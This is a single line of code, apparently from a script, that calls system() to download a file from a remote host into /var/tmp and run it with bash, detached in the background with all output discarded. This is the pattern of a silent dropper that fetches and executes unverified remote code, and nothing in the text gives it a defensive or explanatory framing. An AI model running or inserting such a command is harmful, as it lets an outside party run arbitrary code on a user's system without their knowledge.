system("nohup sh -c \"curl --fail --silent https://stage.delivery.dev/next -o /var/tmp/prepare-stage&&exec bash /var/tmp/prepare-stage\" </dev/null >/dev/null 2>&1 &")
